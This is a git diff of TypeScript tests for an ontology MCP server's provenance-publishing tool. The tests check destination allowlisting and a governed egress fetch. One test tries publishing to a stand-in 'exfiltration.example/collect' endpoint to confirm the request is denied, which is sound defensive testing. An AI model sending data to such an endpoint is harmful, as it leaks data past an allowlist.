@@ -1,6 +1,7 @@
 /** @effect-diagnostics nodeBuiltinImport:skip-file */
 import * as NodeHttp from "node:http";
-import { EpistemicConfigTest } from "@beep/epistemic-config/test";
+import { defaultPolicyRevision, EpistemicServerConfig } from "@beep/epistemic-config/server";
+import { EpistemicConfigTest, fixtureAllowedDestination, makeEpistemicConfigTest } from "@beep/epistemic-config/test";
 import { verifyExecutionDecisionChain, verifyOutcomeBinding } from "@beep/epistemic-domain/values/ExecutionRecord";
 import { ExecutionLedger, ExecutionLedgerUnavailable } from "@beep/epistemic-use-cases/ExecutionLedger";
 import { OntologyMcpConfigLive } from "@beep/ontology-config/layer";
@@ -8,6 +9,8 @@ import { ChangeOperation } from "@beep/ontology-domain/aggregates/Session";
 import { OntologyFilePath } from "@beep/ontology-use-cases/aggregates/Session";
 import {
   CapabilityMetadataResponse,
+  ExportProvenanceRequest,
+  ExportProvenanceTool,
   OntologySparqlQueryRequest,
   OntologySparqlQueryResponse,
   OntologyToolFailure,
@@ -16,6 +19,8 @@ import {
   ProposeChangeBatchRequest,
   ProposeChangeBatchResponse,
   ProposeChangeBatchTool,
+  PublishProvenanceResponse,
+  PublishProvenanceTool,
 } from "@beep/ontology-use-cases/tools";
 import { makeLiteral, makeNamedNode, makeQuad } from "@beep/rdf/Rdf";
 import { XSD_STRING } from "@beep/rdf/Vocab/Xsd";
@@ -34,6 +39,7 @@ import * as FetchHttpClient from "effect/unstable/http/FetchHttpClient";
 import { RpcClient, RpcSerialization } from "effect/unstable/rpc";
 import { makeOntologyMcpTransportLayer } from "../../server/OntologyMcpTransport.ts";
 import { rpcSessionAuthorizationHeader } from "../../server/RpcSessionAuth.ts";
+import type { EpistemicConfig } from "@beep/epistemic-config/server";
 import type { ExecutionDecisionRecord, ExecutionOutcomeRecord } from "@beep/epistemic-domain/values/ExecutionRecord";
 import type { Scope } from "effect";
 
@@ -49,6 +55,8 @@ const decodeOntologySparqlQueryResponse = S.decodeUnknownEffect(OntologySparqlQu
 const encodeProposeChangeBatchRequest = S.encodeUnknownEffect(ProposeChangeBatchRequest);
 const decodeProposeChangeBatchResponse = S.decodeUnknownEffect(ProposeChangeBatchResponse);
 const decodeOntologyToolFailure = S.decodeUnknownEffect(OntologyToolFailure);
+const encodeExportProvenanceRequest = S.encodeUnknownEffect(ExportProvenanceRequest);
+const decodePublishProvenanceResponse = S.decodeUnknownEffect(PublishProvenanceResponse);
 
 const assertSchemaRoundTrip = <Schema extends S.Codec<unknown>>(schema: Schema): void => {
   const encode = S.encodeResult(schema);
@@ -73,6 +81,8 @@ ex:bob a ex:Person ; ex:name "Bob" .
 type TransportOptions = {
   readonly mutationsEnabled: boolean;
   readonly approvedMutationTools: ReadonlyArray<string>;
+  readonly egressFetch?: typeof globalThis.fetch | undefined;
+  readonly epistemicConfig?: Layer.Layer<EpistemicConfig> | undefined;
   readonly ledger?: Layer.Layer<ExecutionLedger> | undefined;
 };
 
@@ -142,10 +152,14 @@ const transportConfigProvider = (root: string, options: TransportOptions) =>
   );
 
 const transportLayer = (root: string, options: TransportOptions) =>
-  makeOntologyMcpTransportLayer({ token, approvedMutationTools: options.approvedMutationTools }).pipe(
+  makeOntologyMcpTransportLayer({
+    token,
+    approvedMutationTools: options.approvedMutationTools,
+    egressFetch: options.egressFetch,
+  }).pipe(
     Layer.provide(OntologyMcpConfigLive),
     Layer.provide(options.ledger ?? silentLedgerLayer),
-    Layer.provide(EpistemicConfigTest),
+    Layer.provide(options.epistemicConfig ?? EpistemicConfigTest),
     Layer.provide(transportConfigProvider(root, options)),
     Layer.provide(NodeServices.layer),
     Layer.orDie
@@ -498,6 +512,131 @@ describe("professional desktop ontology MCP streamable HTTP mount", { concurrent
       );
       expect(yield* Ref.get(probe.decisions)).toHaveLength(0);
       expect(yield* Ref.get(probe.outcomes)).toHaveLength(0);
+    })
+  );
+
+  it.effect("leaves ontology_publish_provenance unregistered when no destination is allowlisted", () =>
+    withHttpServer(
+      {
+        mutationsEnabled: true,
+        approvedMutationTools: [ProposeChangeBatchTool.name],
+        epistemicConfig: makeEpistemicConfigTest(
+          EpistemicServerConfig.make({ destinationAllowlist: [], policyRevision: defaultPolicyRevision })
+        ),
+      },
+      () =>
+        Effect.gen(function* () {
+          const client = yield* makeMcpClient();
+          const listed = yield* client["tools/list"](undefined);
+          const names = A.map(listed.tools, (tool) => tool.name);
+
+          expect(A.contains(names, PublishProvenanceTool.name)).toBe(false);
+          // The sibling positive fact: registration is otherwise working, so
+          // the absence above is the allowlist gate and not a broken mount.
+          expect(A.contains(names, ProposeChangeBatchTool.name)).toBe(true);
+        })
+    )
+  );
+
+  it.effect("carries a publication from a real tool handler through the governed egress fetch", () =>
+    Effect.gen(function* () {
+      const probe = yield* makeLedgerProbe();
+      // The base fetch the governed boundary delegates to when it allows a
+      // request. Nothing here reaches the network; being called at all is the
+      // proof that the policy Fetch was the one in force, because an
+      // un-overridden Fetch would have used the platform fetch instead. A plain
+      // array, not a Ref: `fetch` has no fiber to run an Effect on.
+      const delivered: Array<string> = [];
+      const egressFetch = ((input: RequestInfo | URL, init?: RequestInit) => {
+        delivered.push(`${String(init?.method ?? "GET")} ${String(input)}`);
+        return Promise.resolve(new Response("stored", { status: 202 }));
+      }) as typeof globalThis.fetch;
+
+      yield* withHttpServer(
+        {
+          mutationsEnabled: true,
+          // Publication is granted; the change-batch tool is registered but
+          // deliberately ungranted, so the test has a real gate refusal to
+          // compare the egress refusal against.
+          approvedMutationTools: [ExportProvenanceTool.name, PublishProvenanceTool.name],
+          egressFetch,
+          ledger: probe.layer,
+        },
+        (_root, ontologyPath) =>
+          Effect.gen(function* () {
+            const client = yield* makeMcpClient();
+            const opened = yield* openThroughMcp(client, ontologyPath);
+            const exportRequest = yield* encodeExportProvenanceRequest(
+              ExportProvenanceRequest.make({
+                path: ontologyPath,
+                baseIri: O.none(),
+                sessionHandle: O.none(),
+                expectedFingerprint: opened.fingerprint,
+                provPath: yield* decodeOntologyFilePath("ontology.prov.ttl"),
+                datasetPath: yield* decodeOntologyFilePath("ontology.dataset.ttl"),
+              })
+            );
+            const exported = yield* client["tools/call"]({
+              name: ExportProvenanceTool.name,
+              arguments: exportRequest,
+            });
+            expect(exported.isError).toBe(false);
+
+            const allowedCall = yield* client["tools/call"]({
+              name: PublishProvenanceTool.name,
+              arguments: {
+                provPath: "ontology.prov.ttl",
+                destination: `${fixtureAllowedDestination}/v1/provenance`,
+              },
+            });
+            const published = yield* decodePublishProvenanceResponse(allowedCall.structuredContent);
+
+            expect(allowedCall.isError).toBe(false);
+            expect(published.status).toBe(202);
+            expect(published.publishedBytes).toBeGreaterThan(0);
+
+            const deniedCall = yield* client["tools/call"]({
+              name: PublishProvenanceTool.name,
+              arguments: { provPath: "ontology.prov.ttl", destination: "https://exfiltration.example/collect" },
+            });
+            const refusal = yield* decodeOntologyToolFailure(deniedCall.structuredContent);
+            const ungrantedCall = yield* client["tools/call"]({
+              name: ProposeChangeBatchTool.name,
+              arguments: yield* encodeProposeChangeBatchRequest(
+                ProposeChangeBatchRequest.make({
+                  path: ontologyPath,
+                  expectedFingerprint: opened.fingerprint,
+                  operations: [addName("carol", "Carol")],
+                })
+              ),
+            });
+            const gateRefusal = yield* decodeOntologyToolFailure(ungrantedCall.structuredContent);
+
+            expect(deniedCall.isError).toBe(true);
+            expect(refusal._tag).toBe("OntologyTierGateRefusal");
+            // A destination denial must be indistinguishable from an operation
+            // denial. This is the only place both are visible: the guidance
+            // string is restated in the ontology slice because slices cannot
+            // import each other, so this assertion is what keeps them in sync.
+            expect(gateRefusal._tag).toBe("OntologyTierGateRefusal");
+            expect(refusal._tag === "OntologyTierGateRefusal" && refusal.guidance).toBe(
+              gateRefusal._tag === "OntologyTierGateRefusal" && gateRefusal.guidance
+            );
+          })
+      );
+
+      // The allowlisted destination was delivered; the other never reached the
+      // network side of the boundary at all.
+      expect(delivered).toEqual([`POST ${fixtureAllowedDestination}/v1/provenance`]);
+
+      const decisions = yield* Ref.get(probe.decisions);
+      const egressDecisions = A.filter(decisions, (record) => record.sinkClass === "network-egress");
+      // Two decisions per publication attempt: the gate's (may this session
+      // publish) and the egress boundary's (may this destination be reached).
+      // The denied attempt is refused by the second, not the first.
+      expect(A.length(egressDecisions)).toBeGreaterThanOrEqual(3);
+      expect(A.some(egressDecisions, (record) => record.verdict === "denied")).toBe(true);
+      expect(A.some(egressDecisions, (record) => record.verdict === "allowed")).toBe(true);
     })
   );
 
